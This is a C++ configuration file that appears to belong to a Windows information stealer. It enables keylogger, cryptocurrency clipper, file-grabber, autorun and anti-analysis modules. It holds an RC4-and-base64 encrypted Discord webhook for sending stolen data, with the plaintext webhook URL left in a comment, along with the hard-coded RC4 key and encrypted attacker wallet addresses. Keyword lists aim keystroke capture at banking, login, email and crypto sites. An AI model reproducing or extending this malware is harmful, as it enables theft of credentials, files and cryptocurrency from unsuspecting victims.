#include <string>
#include "Config.h"
#include "rc4.h"
#include "base64.h"
#include <iostream>

// Define and initialize static members of the Config class
int Config::GrabberSizeLimit = 5 * 1024 * 1024; // Set a size limit for the grabber module (5 MB)

// Define various configuration parameters as strings, initialized with placeholders
//std::string Config::Mutex = "1";
std::string Config::StartDelay = "1"; 
std::string Config::Autorun = "1";
std::string Config::AntiAnalysis = "1";
std::string Config::KeyloggerModule = "1";
std::string Config::ClipperModule = "1";  // Placeholder for clipper module (cryptocurrency address modification)
std::string Config::GrabberModule = "1";  // Placeholder for grabber module (file collection)

//// Webhook configuration as an encrypted placeholder string
// ====================================    rc4 to base64 ecoded    ===================================
std::string Config::Webhook = "OV80CdSKaFJ3p8Y6ctqGEW1dWLlGR/P3qVYbMibH8dl2FwwZlP7sqEgp855WJgrnmK/dsPRcLtGanLEk9OgXs6RXjTsm/70VNJcevHwstV2v6ovXscFg+idngGQAU8np8A1bWTB/Tw/R++akwwnNVOkQX5KGmKKuLdcEYg==";

//https://discordapp.com/api/webhooks/1309779606127251497/oNEo7ziD8V0G7iCQIIgBa-1rYU9iDNtW5nAJijyVrdNziLd39blTHXyw2MAnnNNVUDh1

// Define encrypted avatar and username placeholders  {{Discord bot username & password}}
std::string Config::Avatar = "OV80CdSKaFJ8vtA3fMHME3JAWbxIXLX1tlEaLCDK";  // Encrypted avatar data
std::string Config::Username = "MkowDcbZKQ==";  // Encrypted username data


// Define a mapping between file types and their associated extensions
 std::unordered_map<Config::FileType, std::vector<std::string>> Config::GrabberFileTypes_unordered_map{
    { Config::FileType::Document, { "pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt", "rdp", "txt"}},
    { Config::FileType::DataBase, { "db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk", "dbf", "wallet", "ini" } },
    { Config::FileType::SourceCode, { "c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "json", "conf", "css", "php", "go", "js", "rb", "pl", "swift", "java", "kt", "kts", "ino" } },
    { Config::FileType::Image, { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" } }
};

// Define a map for cryptocurrency clipper addresses with encrypted placeholders
std::unordered_map<std::string, std::string> Config::ClipperAddresses{
    { "btc", "\x59\x42\x67\x6d\x53\x70\x37\x6d\x4e\x42\x63\x68\x68\x73\x4d\x75\x52\x38\x71\x59\x4d\x53\x35\x64\x45\x62\x78\x38\x54\x70\x33\x34\x75\x31\x64\x63\x43\x41\x76\x69\x71\x4d\x56\x49\x42\x51\x3d\x3d" },
    { "eth", "\x59\x56\x4e\x78\x51\x63\x47\x42\x64\x55\x6f\x71\x2b\x4e\x52\x75\x4c\x63\x76\x61\x52\x69\x78\x4f\x51\x65\x78\x4d\x47\x2b\x6d\x6c\x37\x51\x34\x41\x66\x58\x66\x42\x72\x6f\x38\x6f\x47\x45\x59\x48\x6b\x2f\x2b\x2b\x39\x30\x34\x74" },
    { "usdt", "\x42\x48\x6f\x43\x45\x4d\x7a\x38\x41\x79\x31\x6e\x74\x75\x4d\x30\x61\x4e\x69\x37\x4a\x43\x56\x6f\x52\x4a\x78\x52\x51\x72\x50\x48\x36\x56\x55\x41\x4c\x78\x50\x4b\x30\x6f\x52\x4a\x4e\x44\x6c\x50\x6b\x35\x32\x5a\x34\x43\x67\x72\x69\x5a\x38\x4f\x51\x6b\x79\x76"},
    { "ton", "\x42\x48\x6f\x43\x45\x4d\x7a\x38\x41\x79\x31\x6e\x74\x75\x4d\x30\x61\x4e\x69\x37\x4a\x43\x56\x6f\x52\x4a\x78\x52\x51\x72\x50\x48\x36\x56\x55\x41\x4c\x78\x50\x4b\x30\x6f\x52\x4a\x4e\x44\x6c\x50\x6b\x35\x32\x5a\x34\x43\x67\x72\x69\x5a\x38\x4f\x51\x6b\x79\x76"}
};

//std::unordered_map<std::string, std::string> Config::ClipperAddresses{
//    { "btc", "\x60\x18\x26\x4a\x9e\xe6\x34\x17\x21\x86\xc3\x2e\x47\xca\x98\x31\x2e\x5d\x11\xbc\x7c\x4e\x9d\xf8\xbb\x57\x5c\x08\x0b\xe2\xa8\xc5\x48\x05" },  // Placeholder for Bitcoin address
//    { "eth", "\x61\x53\x71\x41\xc1\x81\x75\x4a\x2a\xf8\xd4\x6e\x2d\xcb\xda\x46\x2c\x4e\x41\xec\x4c\x1b\xe9\xa5\xed\x0e\x00\x7d\x77\xc1\xae\x8f\x28\x18\x46\x07\x93\xff\xbe\xf7\x4e\x2d" },  // Placeholder for Ethereum address
//    { "usdt", "\x04\x7a\x02\x10\xcc\xfc\x03\x2d\x67\xb6\xe3\x34\x68\xd8\xbb\x24\x25\x68\x44\x9c\x51\x42\xb3\xc7\xe9\x55\x00\x2f\x13\xca\xd2\x84\x49\x34\x39\x4f\x93\x9d\x99\xe0\x28\x2b\x89\x9f\x0e\x42\x4c\xaf" },  // Placeholder for Litecoin address
//    { "ton", "\x04\x7a\x02\x10\xcc\xfc\x03\x2d\x67\xb6\xe3\x34\x68\xd8\xbb\x24\x25\x68\x44\x9c\x51\x42\xb3\xc7\xe9\x55\x00\x2f\x13\xca\xd2\x84\x49\x34\x39\x4f\x93\x9d\x99\xe0\x28\x2b\x89\x9f\x0e\x42\x4c\xaf" }   // Placeholder for Stellar address
//};

// Define vectors for various monitored services
std::vector<std::string> Config::KeyloggerServices = {
    "facebook", "twitter", "chat", "telegram", "skype", "discord", "viber","message", "gmail", "protonmail", "edge", "opera mini",
    "outlook", "password", "encryption","account", "login", "key", "sign in", "bank", "credit", "card", "shop", "firefox", "brave",
    "buy", "sell", "secret" "agent", "customer", "Admin", "Administrator", "Dashboard" "staff", "user", "paymant", "chrome"
};

std::vector<std::string> Config::BankingServices = {
    "qiwi", "money", "exchange", "bank", "credit", "card", "paypal"
};

std::vector<std::string> Config::CryptoServices = {
    "bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin",
    "btc", "eth", "xmr", "xlm", "xrp", "ltc", "bch", "blockchain",
    "paxful", "investopedia", "buybitcoinworldwide", "cryptocurrency",
    "crypto", "trade", "trading", "wallet", "coinomi", "coinbase"
};

// Initialize configuration and decrypt sensitive data
void Config::Init()
{
    // Decrypt Discord webhook, username, and avatar
    std::string Webhook_b64decode = base64_decode(Config::Webhook);
    const unsigned char* Webhook_str_To_char = reinterpret_cast<const unsigned char*>(Webhook_b64decode.c_str());
    Webhook = (char*)RC4((char*)"Calderaint=1@1&1%", (unsigned char*)Webhook_str_To_char, Webhook_b64decode.length());

    std::string Username_b64decode = base64_decode(Config::Username);
    const unsigned char* Username_str_To_char = reinterpret_cast<const unsigned char*>(Username_b64decode.c_str());
    Username = (char*)RC4((char*)"Calderaint=1@1&1%", (unsigned char*)Username_str_To_char, Username_b64decode.length());

    std::string Avatar_b64decode = base64_decode(Config::Webhook);
    const unsigned char* Avatar_str_To_char = reinterpret_cast<const unsigned char*>(Avatar_b64decode.c_str());
    Avatar = (char*)RC4((char*)"Calderaint=1@1&1%", (unsigned char*)Avatar_str_To_char, Avatar_b64decode.length());
        

    // Decrypt and load clipper addresses for various cryptocurrencies
    std::string btc_base64 = base64_decode(ClipperAddresses["btc"]);
    const unsigned char* btc_base64_str_To_char = reinterpret_cast<const unsigned char*>(btc_base64.c_str());
    ClipperAddresses["btc"] = (char*)RC4((char*)"Calderaint=1@1&1%", (unsigned char*)btc_base64_str_To_char, btc_base64.length());

    std::string eth_base64 = base64_decode(ClipperAddresses["eth"]);
    const unsigned char* eth_base64_str_To_char = reinterpret_cast<const unsigned char*>(eth_base64.c_str());
    ClipperAddresses["eth"] = (char*)RC4((char*)"Calderaint=1@1&1%", (unsigned char*)eth_base64_str_To_char, eth_base64.length());

    std::string usdt_base64 = base64_decode(ClipperAddresses["usdt"]);
    const unsigned char* usdt_base64_str_To_char = reinterpret_cast<const unsigned char*>(usdt_base64.c_str());
    ClipperAddresses["usdt"] = (char*)RC4((char*)"Calderaint=1@1&1%", (unsigned char*)usdt_base64_str_To_char, usdt_base64.length());

    std::string ton_base64 = base64_decode(ClipperAddresses["ton"]);
    const unsigned char* ton_base64_str_To_char = reinterpret_cast<const unsigned char*>(ton_base64.c_str());
    ClipperAddresses["ton"] = (char*)RC4((char*)"Calderaint=1@1&1%", (unsigned char*)ton_base64_str_To_char, ton_base64.length());

}
